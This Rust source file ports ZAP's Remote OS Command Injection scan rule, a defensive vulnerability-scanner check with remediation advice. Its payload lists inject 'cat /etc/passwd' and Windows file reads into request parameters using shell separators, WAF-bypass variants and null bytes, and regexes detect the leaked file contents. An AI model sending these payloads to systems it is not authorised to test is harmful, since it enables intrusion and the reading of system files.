//! Ported from ZAP CommandInjectionScanRule (ascanrules, Apache License 2.0).

use std::sync::LazyLock;

use regex::Regex;

use super::common::{by_strength, insert_uninit_var, point, unescape_html4};
use crate::scan::active::{ActiveRule, BoxFuture, Cx, RuleScope};
use crate::scan::{AlertDef, Confidence, Risk};

pub(super) const DESCRIPTION: &str = "Attack technique used for unauthorized execution of operating system commands. \
    This attack is possible when an application accepts untrusted input to build operating system commands in an \
    insecure manner involving improper data sanitization, and/or improper calling of external programs.";
pub(super) const REFERENCES: &[&str] =
    &["https://cwe.mitre.org/data/definitions/78.html", "https://owasp.org/www-community/attacks/Command_Injection"];
pub(super) const TAGS: &[&str] =
    &["OWASP_2025_A05", "OWASP_2021_A03", "OWASP_2017_A01", "WSTG-v42-INPV-12", "API_2023_API10", "HIPAA", "PCI_DSS"];

/// The solution of ZAP's "wasc_31" (OS Commanding) vulnerability entry.
#[rustfmt::skip]
pub(super) const SOLUTION: &str = "If at all possible, use library calls rather than external processes to recreate the \
    desired functionality.\n\nRun your code in a \"jail\" or similar sandbox environment that enforces strict \
    boundaries between the process and the operating system. This may effectively restrict which files can be \
    accessed in a particular directory or which commands can be executed by your software.\n\nOS-level examples \
    include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. \
    For example, java.io.FilePermission in the Java SecurityManager allows you to specify restrictions on file \
    operations.\nThis may not be a feasible solution, and it only limits the impact to the operating system; \
    the rest of your application may still be subject to compromise.\n\nFor any data that will be used to \
    generate a command to be executed, keep as much of that data out of external control as possible. For \
    example, in web applications, this may require storing the command locally in the session's state instead \
    of sending it out to the client in a hidden form field.\n\nUse a vetted library or framework that does not \
    allow this weakness to occur or provides constructs that make this weakness easier to avoid.\n\nFor \
    example, consider using the ESAPI Encoding control or a similar tool, library, or framework. These will \
    help the programmer encode outputs in a manner less prone to error.\n\nIf you need to use \
    dynamically-generated query strings or commands in spite of the risk, properly quote arguments and escape \
    any special characters within those arguments. The most conservative approach is to escape or filter all \
    characters that do not pass an extremely strict allow list (such as everything that is not alphanumeric or \
    white space). If some special characters are still needed, such as white space, wrap each argument in \
    quotes after the escaping/filtering step. Be careful of argument injection.\n\nIf the program to be \
    executed allows arguments to be specified within an input file or from standard input, then consider using \
    that mode to pass arguments instead of the command line.\n\nIf available, use structured mechanisms that \
    automatically enforce the separation between data and code. These mechanisms may be able to provide the \
    relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide \
    this capability at every point where output is generated.\n\nSome languages offer multiple functions that \
    can be used to invoke commands. Where possible, identify any function that invokes a command shell using a \
    single string, and replace it with a function that requires individual arguments. These functions typically \
    perform appropriate quoting and filtering of arguments. For example, in C, the system() function accepts a \
    string that contains the entire command to be executed, whereas execl(), execve(), and others require an \
    array of strings, one for each argument. In Windows, CreateProcess() only accepts one command at a time. In \
    Perl, if system() is provided with an array of arguments, then it will quote each of the arguments.\n\n\
    Assume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use an allow \
    list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly \
    conform to specifications, or transform it into something that does. Do not rely exclusively on looking for \
    malicious or malformed inputs (i.e., do not rely on a deny list). However, deny lists can be useful for \
    detecting potential attacks or determining which inputs are so malformed that they should be rejected \
    outright.\n\nWhen performing input validation, consider all potentially relevant properties, including \
    length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency \
    across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" \
    may be syntactically valid because it only contains alphanumeric characters, but it is not valid if you are \
    expecting colors such as \"red\" or \"blue.\"\n\nWhen constructing OS command strings, use stringent allow \
    lists that limit the character set based on the expected value of the parameter in the request. This will \
    indirectly limit the scope of an attack, but this technique is less important than proper output encoding \
    and escaping.\n\nNote that proper output encoding, escaping, and quoting is the most effective solution for \
    preventing OS command injection, although input validation may provide some defense-in-depth. This is \
    because it effectively limits what will appear in output. Input validation will not always prevent OS \
    command injection, especially if you are required to support free-form text fields that could contain \
    arbitrary characters. For example, when invoking a mail program, you might need to allow the subject field \
    to contain otherwise-dangerous inputs like \";\" and \">\" characters, which would need to be escaped or \
    otherwise handled. In this case, stripping the character might reduce the risk of OS command injection, but \
    it would produce incorrect behavior because the subject field would not be recorded as the user intended. \
    This might seem to be a minor inconvenience, but it could be more important when the program relies on \
    well-structured subject lines in order to pass messages to other components.\n\nEven if you make a mistake \
    in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely \
    to protect you from injection-based attacks. As long as it is not done in isolation, input validation is \
    still a useful technique, since it may significantly reduce your attack surface, allow you to detect some \
    attacks, and provide other security benefits that proper encoding does not address.";

static ALERT: AlertDef = AlertDef {
    alert_ref: "90020",
    name: "Remote OS Command Injection",
    risk: Risk::High,
    confidence: Confidence::Medium,
    cwe: 78,
    wasc: 31,
    description: DESCRIPTION,
    solution: SOLUTION,
    references: REFERENCES,
    tags: TAGS,
};

static ALERTS: [&AlertDef; 1] = [&ALERT];

const NIX_TEST_CMD: &str = "cat /etc/passwd";
const WIN_TEST_CMD: &str = "type %SYSTEMROOT%\\win.ini";
const PS_TEST_CMD: &str = "get-help";
const NULL: &str = "\0";

/// `root:.:0:0` (the dot matches 'x' or '!', used in AIX).
static NIX_CTRL: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"root:.:0:0").unwrap());
static WIN_CTRL: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\[fonts\]").unwrap());
/// Java `(?:\sGet-Help)(?i)|cmdlet|get-alias`: the inline flag makes only the
/// alternatives after it case-insensitive.
static PS_CTRL: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\sGet-Help|(?i:cmdlet|get-alias)").unwrap());

/// *nix payloads in ZAP's order (one random uninitialised variable per run, as ZAP
/// computes it once per class load).
static NIX_PAYLOADS: LazyLock<Vec<String>> = LazyLock::new(|| {
    let c = NIX_TEST_CMD;
    let v = insert_uninit_var(NIX_TEST_CMD);
    let mut p = vec![
        // No quote, double quote, single quote, then special payloads.
        c.to_string(),
        format!("&{c}&"),
        format!(";{c};"),
        format!("\"&{c}&\""),
        format!("\";{c};\""),
        format!("'&{c}&'"),
        format!("';{c};'"),
        format!("\n{c}\n"), // force enter
        format!("`{c}`"),   // backtick execution
        format!("||{c}"),   // or control concatenation
        format!("&&{c}"),   // and control concatenation
        format!("|{c}#"),   // pipe & comment
    ];
    // Uninitialized variable WAF bypass.
    p.extend([
        format!("&{v}&"),
        format!(";{v};"),
        format!("\"&{v}&\""),
        format!("\";{v};\""),
        format!("'&{v}&'"),
        format!("';{v};'"),
        format!("\n{v}\n"),
        format!("`{v}`"),
        format!("||{v}"),
        format!("&&{v}"),
        format!("|{v}#"),
    ]);
    // Null byte payloads, so a suffix the application appends is ignored.
    p.extend([
        format!(";{c}{NULL}"),
        format!("&{c}{NULL}"),
        format!("\"&{c}{NULL}"),
        format!("\";{c}{NULL}"),
        format!("'&{c}{NULL}"),
        format!("';{c}{NULL}"),
        format!("||{c}{NULL}"),
        format!("&&{c}{NULL}"),
    ]);
    p.extend([
        format!("&{v}{NULL}"),
        format!(";{v}{NULL}"),
        format!("\"&{v}{NULL}"),
        format!("\";{v}{NULL}"),
        format!("'&{v}{NULL}"),
        format!("';{v}{NULL}"),
        format!("||{v}{NULL}"),
        format!("&&{v}{NULL}"),
    ]);
    p
});

static WIN_PAYLOADS: LazyLock<Vec<String>> = LazyLock::new(|| {
    let c = WIN_TEST_CMD;
    vec![
        c.to_string(),
        format!("&{c}"),
        format!("|{c}"),
        format!("\"&{c}&\""),
        format!("\"|{c}"),
        format!("'&{c}&'"),
        format!("'|{c}"),
        format!("run {c}"), // FoxPro for running os commands
        format!("&{c}{NULL}"),
        format!("|{c}{NULL}"),
        format!("\"&{c}{NULL}"),
        format!("\"|{c}{NULL}"),
        format!("'&{c}{NULL}"),
        format!("'|{c}{NULL}"),
        format!("run {c}{NULL}"),
    ]
});

static PS_PAYLOADS: LazyLock<Vec<String>> = LazyLock::new(|| {
    let c = PS_TEST_CMD;
    vec![c.to_string(), format!(";{c}"), format!("\";{c}"), format!("';{c}"), format!(";{c} #")]
});

/// `ascanrules.commandinjection.otherinfo`.
fn other_info(attack: &str) -> String {
    format!(
        "The scan rule was able to retrieve the content of a file or command by sending [{attack}] to the operating \
         system running this application."
    )
}

pub struct CommandInjection;

impl ActiveRule for CommandInjection {
    fn id(&self) -> u32 {
        90020
    }

    fn name(&self) -> &'static str {
        "Remote OS Command Injection"
    }

    fn alerts(&self) -> &'static [&'static AlertDef] {
        &ALERTS
    }

    fn scope(&self) -> RuleScope {
        RuleScope::Param
    }

    fn scan<'a>(&'a self, cx: &'a Cx) -> BoxFuture<'a> {
        Box::pin(async move {
            let max = PS_PAYLOADS.len().max(NIX_PAYLOADS.len()).max(WIN_PAYLOADS.len());
            let target_count = by_strength(cx.strength(), [3, 7, 13, max]);
            // All OS technologies are in scope: *nix, then Windows cmd, then PowerShell.
            for (payloads, ctrl) in
                [(&*NIX_PAYLOADS, &*NIX_CTRL), (&*WIN_PAYLOADS, &*WIN_CTRL), (&*PS_PAYLOADS, &*PS_CTRL)]
            {
                if cx.stopped() || test_injection(cx, target_count, payloads, ctrl).await {
                    return;
                }
            }
        })
    }
}

/// Feedback based check: the payload's output must show up in the response.
async fn test_injection(cx: &Cx, target_count: usize, payloads: &[String], ctrl: &Regex) -> bool {
    // ZAP skips every payload whose pattern already matches the original response;
    // all payloads of a list share one pattern.
    if ctrl.is_match(cx.base_response().body_str()) {
        return false;
    }
    let (param, value) = point(cx);
    let mut first = true;
    for payload in payloads.iter().take(target_count) {
        let attack = if first { payload.clone() } else { format!("{value}{payload}") };
        first = false;
        let Ok(resp) = cx.send_payload(&attack).await else {
            if cx.stopped() {
                return false;
            }
            continue;
        };
        let body = resp.body_str();
        let content = if resp.content_type().contains("html") { unescape_html4(body) } else { body.to_string() };
        if let Some(m) = ctrl.find(&content) {
            let finding = ALERT.raise(param, m.as_str()).attack(attack.clone()).other_info(other_info(&attack));
            cx.report(finding, &resp);
            return true;
        }
        if cx.stopped() {
            return false;
        }
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payload_lists() {
        assert_eq!((NIX_PAYLOADS.len(), WIN_PAYLOADS.len(), PS_PAYLOADS.len()), (39, 15, 5));
        assert_eq!(NIX_PAYLOADS[..3], ["cat /etc/passwd", "&cat /etc/passwd&", ";cat /etc/passwd;"]);
        assert!(NIX_PAYLOADS[12].starts_with("&cat$") && NIX_PAYLOADS[12].ends_with("passwd&"));
        assert_eq!(NIX_PAYLOADS[23], ";cat /etc/passwd\0");
        assert_eq!(WIN_PAYLOADS[1], "&type %SYSTEMROOT%\\win.ini");
        assert_eq!(PS_PAYLOADS[4], ";get-help #");
        // No duplicates (ZAP keys a LinkedHashMap by payload).
        let set: std::collections::HashSet<_> = NIX_PAYLOADS.iter().collect();
        assert_eq!(set.len(), NIX_PAYLOADS.len());
    }

    #[test]
    fn control_patterns() {
        assert!(NIX_CTRL.is_match("root:x:0:0:root:/root:/bin/bash"));
        assert!(NIX_CTRL.is_match("root:!:0:0::/:/usr/bin/ksh"));
        assert!(!NIX_CTRL.is_match("root:xx:0:0"));
        assert!(WIN_CTRL.is_match("; for 16-bit app support\n[fonts]\n[extensions]"));
        assert!(PS_CTRL.is_match("NAME\n    Get-Help"));
        assert!(!PS_CTRL.is_match("NAME\n    get-help"));
        assert!(PS_CTRL.is_match("about the CMDLET"));
        assert!(PS_CTRL.is_match("Get-Alias"));
    }

    #[test]
    fn texts() {
        assert_eq!(SOLUTION.len(), 5794);
        assert!(SOLUTION.starts_with("If at all possible") && SOLUTION.contains("\"accept known good\""));
        assert_eq!(
            other_info("a;cat /etc/passwd "),
            "The scan rule was able to retrieve the content of a file or command by sending [a;cat /etc/passwd ] to \
             the operating system running this application."
        );
    }
}
